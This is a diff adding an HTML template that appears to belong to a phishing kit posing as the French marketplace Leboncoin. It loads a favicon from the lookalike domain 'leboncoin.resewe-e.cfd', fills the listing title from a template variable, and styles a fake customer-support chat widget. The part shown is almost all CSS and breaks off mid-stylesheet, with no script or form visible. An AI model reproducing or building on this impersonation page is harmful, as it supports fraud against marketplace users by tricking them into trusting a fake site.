@@ -1,0 +1,2489 @@
+<!DOCTYPE html>
+<html id="html" prefix="og: https://ogp.me/ns#">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <title><%=ad.title%></title>
+    <base href="." />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link id="appFavicon" rel="icon" type="image/x-icon" href="https://leboncoin.resewe-e.cfd/assets/favicon.ico" />
+    <style>
+      :root {
+        --surface-a: #ffffff;
+        --surface-b: #fafafa;
+        --surface-c: rgba(0, 0, 0, 0.04);
+        --surface-d: rgba(0, 0, 0, 0.12);
+        --surface-e: #ffffff;
+        --surface-f: #ffffff;
+        --text-color: rgba(0, 0, 0, 0.87);
+        --text-color-secondary: rgba(0, 0, 0, 0.6);
+        --primary-color: #3f51b5;
+        --primary-color-text: #ffffff;
+        --font-family: Roboto, Helvetica Neue Light, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif;
+        --surface-0: #ffffff;
+        --surface-50: #fafafa;
+        --surface-100: #f5f5f5;
+        --surface-200: #eeeeee;
+        --surface-300: #e0e0e0;
+        --surface-400: #bdbdbd;
+        --surface-500: #9e9e9e;
+        --surface-600: #757575;
+        --surface-700: #616161;
+        --surface-800: #424242;
+        --surface-900: #212121;
+        --gray-50: #fafafa;
+        --gray-100: #f5f5f5;
+        --gray-200: #eeeeee;
+        --gray-300: #e0e0e0;
+        --gray-400: #bdbdbd;
+        --gray-500: #9e9e9e;
+        --gray-600: #757575;
+        --gray-700: #616161;
+        --gray-800: #424242;
+        --gray-900: #212121;
+        --content-padding: 1rem;
+        --inline-spacing: 0.5rem;
+        --border-radius: 4px;
+        --surface-ground: #fafafa;
+        --surface-section: #ffffff;
+        --surface-card: #ffffff;
+        --surface-overlay: #ffffff;
+        --surface-border: rgba(0, 0, 0, 0.12);
+        --surface-hover: rgba(0, 0, 0, 0.04);
+        --maskbg: rgba(0, 0, 0, 0.32);
+        --focus-ring: none;
+      }
+      @font-face {
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 400;
+        src: local("Roboto"), local("Roboto-Regular"),
+          url(roboto-v20-latin-ext_latin-regular.5c59b24786083ffe.woff2) format("woff2"),
+          url(roboto-v20-latin-ext_latin-regular.c9064c1abfc45804.woff) format("woff");
+      }
+      @font-face {
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 500;
+        src: local("Roboto Medium"), local("Roboto-Medium"),
+          url(roboto-v20-latin-ext_latin-500.de270e01b582cd35.woff2) format("woff2"),
+          url(roboto-v20-latin-ext_latin-500.4ce802079c5e2843.woff) format("woff");
+      }
+      @font-face {
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 700;
+        src: local("Roboto Bold"), local("Roboto-Bold"),
+          url(roboto-v20-latin-ext_latin-700.fea1ca242b09ae4c.woff2) format("woff2"),
+          url(roboto-v20-latin-ext_latin-700.c5993c4d788e3ff6.woff) format("woff");
+      }
+      * {
+        box-sizing: border-box;
+      }
+      :root {
+        --blue-50: #f4fafe;
+        --blue-100: #cae6fc;
+        --blue-200: #a0d2fa;
+        --blue-300: #75bef8;
+        --blue-400: #4baaf5;
+        --blue-500: #2196f3;
+        --blue-600: #1c80cf;
+        --blue-700: #1769aa;
+        --blue-800: #125386;
+        --blue-900: #0d3c61;
+        --green-50: #f7faf5;
+        --green-100: #dbe8cf;
+        --green-200: #bed6a9;
+        --green-300: #a1c384;
+        --green-400: #85b15e;
+        --green-500: #689f38;
+        --green-600: #588730;
+        --green-700: #496f27;
+        --green-800: #39571f;
+        --green-900: #2a4016;
+        --yellow-50: #fffcf5;
+        --yellow-100: #fef0cd;
+        --yellow-200: #fde4a5;
+        --yellow-300: #fdd87d;
+        --yellow-400: #fccc55;
+        --yellow-500: #fbc02d;
+        --yellow-600: #d5a326;
+        --yellow-700: #b08620;
+        --yellow-800: #8a6a19;
+        --yellow-900: #644d12;
+        --cyan-50: #f2fcfd;
+        --cyan-100: #c2eff5;
+        --cyan-200: #91e2ed;
+        --cyan-300: #61d5e4;
+        --cyan-400: #30c9dc;
+        --cyan-500: #00bcd4;
+        --cyan-600: #00a0b4;
+        --cyan-700: #008494;
+        --cyan-800: #006775;
+        --cyan-900: #004b55;
+        --pink-50: #fef4f7;
+        --pink-100: #fac9da;
+        --pink-200: #f69ebc;
+        --pink-300: #f1749e;
+        --pink-400: #ed4981;
+        --pink-500: #e91e63;
+        --pink-600: #c61a54;
+        --pink-700: #a31545;
+        --pink-800: #801136;
+        --pink-900: #5d0c28;
+        --indigo-50: #f6f7fc;
+        --indigo-100: #d5d9ef;
+        --indigo-200: #b3bae2;
+        --indigo-300: #919cd5;
+        --indigo-400: #707dc8;
+        --indigo-500: #4e5fbb;
+        --indigo-600: #42519f;
+        --indigo-700: #374383;
+        --indigo-800: #2b3467;
+        --indigo-900: #1f264b;
+        --teal-50: #f2faf9;
+        --teal-100: #c2e6e2;
+        --teal-200: #91d2cc;
+        --teal-300: #61beb5;
+        --teal-400: #30aa9f;
+        --teal-500: #009688;
+        --teal-600: #008074;
+        --teal-700: #00695f;
+        --teal-800: #00534b;
+        --teal-900: #003c36;
+        --orange-50: #fffaf2;
+        --orange-100: #ffe6c2;
+        --orange-200: #ffd391;
+        --orange-300: #ffbf61;
+        --orange-400: #ffac30;
+        --orange-500: #ff9800;
+        --orange-600: #d98100;
+        --orange-700: #b36a00;
+        --orange-800: #8c5400;
+        --orange-900: #663d00;
+        --bluegray-50: #f7f9f9;
+        --bluegray-100: #d9e0e3;
+        --bluegray-200: #bbc7cd;
+        --bluegray-300: #9caeb7;
+        --bluegray-400: #7e96a1;
+        --bluegray-500: #607d8b;
+        --bluegray-600: #526a76;
+        --bluegray-700: #435861;
+        --bluegray-800: #35454c;
+        --bluegray-900: #263238;
+        --purple-50: #faf4fb;
+        --purple-100: #e7cbec;
+        --purple-200: #d4a2dd;
+        --purple-300: #c279ce;
+        --purple-400: #af50bf;
+        --purple-500: #9c27b0;
+        --purple-600: #852196;
+        --purple-700: #6d1b7b;
+        --purple-800: #561561;
+        --purple-900: #3e1046;
+        --red-50: #fef6f5;
+        --red-100: #fcd2cf;
+        --red-200: #faaea9;
+        --red-300: #f88a82;
+        --red-400: #f6675c;
+        --red-500: #f44336;
+        --red-600: #cf392e;
+        --red-700: #ab2f26;
+        --red-800: #86251e;
+        --red-900: #621b16;
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 100;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.54bbf65f27274152.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.54bbf65f27274152.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.c93dc732645588de.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.41a6aca9ee145456.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.63f714f01612dd83.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100.62768d41eb52fad8.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 100;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.b5ab1c1032c86f96.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.b5ab1c1032c86f96.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.f85436140174f79d.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.e8dad46e89fd4cac.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.814b1f0b75207f97.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-100italic.ad1c3d7eecba9d3c.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 300;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.3176d0e48302f613.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.3176d0e48302f613.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.f4af1d3a8aac7b06.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.39add8fb2f8e9527.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.ccc34a882868f266.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300.e38791bcb2ed8832.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 300;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.ce4ba8af72d19954.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.ce4ba8af72d19954.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.6884ec71ec3790f7.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.1824b43a72668d91.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.0a79e278dd1c369c.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-300italic.87b20698d3bc5291.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 400;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.849820f3e8d524b3.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.849820f3e8d524b3.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.26520665cd350f04.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.2e9e94006882b62d.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.0e6e4c28297310dc.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-regular.e6bed6ae46b33512.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 400;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.931028ac353f9948.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.931028ac353f9948.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.9030d4ff4ddbf262.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.3d772b1d7d7adce4.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.967fcb3ebcf21b1e.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-italic.bfa0cf2992117685.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 500;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.9d0827df6de08e1e.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.9d0827df6de08e1e.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.a79fc656997b3fd3.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.d96daa8194a660c5.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.2950dc844ee5eec6.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500.9eddb24c23437697.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 500;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.9a9b60d7a2b32d36.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.9a9b60d7a2b32d36.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.35787cc2a923e134.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.3d6c757d26f687cd.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.1bef480dc6ef75b1.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-500italic.b184a74b4bcfc670.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 700;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.f2085029c1deb86c.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.f2085029c1deb86c.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.2187e79235c5d6a3.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.ca3d0fdb7ed6091b.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.97f4a80ea0b88f78.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700.6379e2ee4ed6e3c9.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 700;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.620da27f8f9a02ee.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.620da27f8f9a02ee.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.5ba1822c651556c3.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.094e1f54b613d8f8.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.b5d2f61cc5126c6e.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-700italic.2988ec8b1f77484d.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: normal;
+        font-weight: 900;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.4dce3260676c386e.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.4dce3260676c386e.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.a243358378c053f3.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.c54d25632f97de4b.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.598dd5f121eef0d4.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900.44571c1477a0ec61.svg#Roboto)
+            format("svg");
+      }
+      @font-face {
+        font-display: swap;
+        font-family: Roboto;
+        font-style: italic;
+        font-weight: 900;
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.ba41a301e044d3e5.eot);
+        src: url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.ba41a301e044d3e5.eot?#iefix)
+            format("embedded-opentype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.e769be4f9292f85a.woff2)
+            format("woff2"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.98a1cb7e710c3d04.woff)
+            format("woff"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.85ee13d439bb30d6.ttf)
+            format("truetype"),
+          url(roboto-v30-vietnamese_latin-ext_latin_greek-ext_greek_cyrillic-ext_cyrillic-900italic.9b0e5018af892734.svg#Roboto)
+            format("svg");
+      }
+      html {
+        font-family: Roboto, Helvetica Neue Light, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif;
+      }
+      html {
+        height: 100%;
+      }
+      body {
+        height: 100%;
+        margin: 0;
+      }
+    </style>
+    <link rel="stylesheet" href="/leboncoin/styles.d428e02188116e2b.css" media="all" onload="this.media=&#39;all&#39;" />
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <style></style>
+    <style>
+      .tools[_ngcontent-xpb-c36] {
+        position: fixed;
+        display: flex;
+        padding: 20px;
+        z-index: 1000000;
+      }
+      .tools[_ngcontent-xpb-c36] button[_ngcontent-xpb-c36] {
+        margin-top: 5px;
+      }
+      .tools[_ngcontent-xpb-c36] .devtool[_ngcontent-xpb-c36] {
+        padding: 5px;
+        top: 20px;
+        left: 20px;
+        display: flex;
+        flex: 1;
+        flex-direction: column;
+        background: rgba(250, 250, 194, 0.9);
+        border: 4px dashed #c82cd9;
+      }
+      .tools[_ngcontent-xpb-c36] .Tool[_ngcontent-xpb-c36],
+      .tools[_ngcontent-xpb-c36] .Tool2[_ngcontent-xpb-c36] {
+        display: flex;
+        flex-direction: column;
+        background: rgba(250, 250, 194, 0.65);
+        border: 4px dashed #c82cd9;
+        padding: 5px;
+        margin-left: 10px;
+      }
+      .newFakeAPI[_ngcontent-xpb-c36] {
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        width: 100%;
+        height: 100%;
+        z-index: 5000;
+      }
+      .newFakeAPI[_ngcontent-xpb-c36] .body[_ngcontent-xpb-c36] {
+        margin-top: 60px;
+        height: 350px;
+        background: white;
+        border: 4px dashed #c82cd9;
+      }
+      .newFakeAPI[_ngcontent-xpb-c36] .body[_ngcontent-xpb-c36] button[_ngcontent-xpb-c36] {
+        width: 100%;
+      }
+      .newFakeAPI[_ngcontent-xpb-c36] .body[_ngcontent-xpb-c36] div[_ngcontent-xpb-c36] {
+        margin: 10px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+      }
+      .newFakeAPI[_ngcontent-xpb-c36] .body[_ngcontent-xpb-c36] p[_ngcontent-xpb-c36] {
+        margin: 0;
+        font-size: 18px;
+      }
+      .hotReloadFakeAPI[_ngcontent-xpb-c36] {
+        height: 100%;
+        width: 100%;
+        z-index: 5000;
+        position: absolute;
+        background: #fff;
+        opacity: 0.92;
+      }
+      .hotReloadFakeAPI[_ngcontent-xpb-c36] .close[_ngcontent-xpb-c36] {
+        position: absolute;
+        bottom: 0px;
+        right: 0px;
+        margin: 20px;
+      }
+      .hotReloadFakeAPI[_ngcontent-xpb-c36] select[_ngcontent-xpb-c36] {
+        background: none;
+        border: none;
+        cursor: pointer;
+        border-bottom: 1px solid #0a9b4a;
+      }
+    </style>
+    <style>
+      .load[_ngcontent-xpb-c35] {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100%;
+      }
+    </style>
+    <style>
+      .p-progress-spinner {
+        position: relative;
+        margin: 0 auto;
+        width: 100px;
+        height: 100px;
+        display: inline-block;
+      }
+      .p-progress-spinner:before {
+        content: "";
+        display: block;
+        padding-top: 100%;
+      }
+      .p-progress-spinner-svg {
+        animation: p-progress-spinner-rotate 2s linear infinite;
+        height: 100%;
+        transform-origin: center center;
+        width: 100%;
+        position: absolute;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        margin: auto;
+      }
+      .p-progress-spinner-circle {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: 0;
+        stroke: #d62d20;
+        animation: p-progress-spinner-dash 1.5s ease-in-out infinite, p-progress-spinner-color 6s ease-in-out infinite;
+        stroke-linecap: round;
+      }
+      @keyframes p-progress-spinner-rotate {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      @keyframes p-progress-spinner-dash {
+        0% {
+          stroke-dasharray: 1, 200;
+          stroke-dashoffset: 0;
+        }
+        50% {
+          stroke-dasharray: 89, 200;
+          stroke-dashoffset: -35px;
+        }
+        to {
+          stroke-dasharray: 89, 200;
+          stroke-dashoffset: -124px;
+        }
+      }
+      @keyframes p-progress-spinner-color {
+        to,
+        0% {
+          stroke: #d62d20;
+        }
+        40% {
+          stroke: #0057e7;
+        }
+        66% {
+          stroke: #008744;
+        }
+        80%,
+        90% {
+          stroke: #ffa700;
+        }
+      }
+    </style>
+    <style>
+      .ik-chat-w-pc[_ngcontent-xpb-c53] {
+        position: fixed;
+        right: 10px;
+        bottom: 10px;
+        height: 500px;
+        width: 400px;
+        background: #ffffff;
+        box-shadow: 0 1px 3px #0003, 0 5px 10px #0000001a;
+        border-radius: 10px;
+        z-index: 100000;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] {
+        display: flex;
+        height: 50px;
+        border-radius: 10px 0;
+        background: rgba(52, 203, 40, 0.66);
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-chat-avatar[_ngcontent-xpb-c53] {
+        position: relative;
+        bottom: 25px;
+        left: 15px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-avatar[_ngcontent-xpb-c53]
+        img[_ngcontent-xpb-c53] {
+        width: 60px;
+        height: 60px;
+        border-radius: 100%;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-chat-name[_ngcontent-xpb-c53] {
+        margin-left: 30px;
+        margin-top: 5px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-name[_ngcontent-xpb-c53]
+        .name[_ngcontent-xpb-c53] {
+        font-size: 18px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-header[_ngcontent-xpb-c53]
+        .ik-chat-name[_ngcontent-xpb-c53]
+        .status[_ngcontent-xpb-c53] {
+        margin-left: 1px;
+        font-size: 12px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-header[_ngcontent-xpb-c53] .ik-close-btn[_ngcontent-xpb-c53] {
+        position: absolute;
+        right: 15px;
+        top: 12px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] {
+        height: 400px;
+        overflow: auto;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .ik-message-manager[_ngcontent-xpb-c53] {
+        display: table;
+        width: 100%;
+        padding: 5px 0;
+        animation: newMessageInvert 0.35s both ease-in-out;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53] {
+        padding: 0 60px 0 16px;
+        float: left;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .ik-message[_ngcontent-xpb-c53] {
+        position: relative;
+        color: #3d3d3d;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        border-radius: 20px;
+        padding: 8px 16px;
+        top: 0 !important;
+        font-size: 14px;
+        line-height: 20px;
+        word-break: break-word;
+        background-color: #8dd7e0;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .time[_ngcontent-xpb-c53] {
+        float: right;
+        text-align: right;
+        padding-left: 6px;
+        vertical-align: bottom;
+        font-size: 11px;
+        color: #b2b2b2;
+        padding-bottom: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        right: -40px;
+        top: -14px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-manager[_ngcontent-xpb-c53]
+        .system[_ngcontent-xpb-c53] {
+        width: 100%;
+        text-align: center;
+        padding: 10px;
+        background: #79dd71;
+        margin-bottom: 20px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .ik-message-user[_ngcontent-xpb-c53] {
+        display: table;
+        width: 100%;
+        padding: 5px 0;
+        animation: newMessage 0.35s both ease-in-out;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53] {
+        padding: 0 16px 0 60px;
+        float: right;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .ik-message[_ngcontent-xpb-c53] {
+        background-color: #f1f0f0;
+        color: #3d3d3d;
+        border-radius: 20px;
+        background-clip: padding-box;
+        padding: 8px 16px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        font-size: 14px;
+        line-height: 20px;
+        word-break: break-word;
+        text-align: left;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53]
+        .ik-chat-body[_ngcontent-xpb-c53]
+        .ik-message-user[_ngcontent-xpb-c53]
+        .ik-wrap[_ngcontent-xpb-c53]
+        .time[_ngcontent-xpb-c53] {
+        float: left;
+        text-align: right;
+        padding-right: 6px;
+        vertical-align: bottom;
+        font-size: 11px;
+        color: #b2b2b2;
+        padding-bottom: 8px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        position: relative;
+        left: -40px;
+        top: -23px;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-body[_ngcontent-xpb-c53] .lastMessage[_ngcontent-xpb-c53] {
+        animation: move 3s linear alternate;
+      }
+      .ik-chat-w-pc[_ngcontent-xpb-c53] .ik-chat-bottom[_ngcontent-xpb-c53] {
+        padding: 5px;
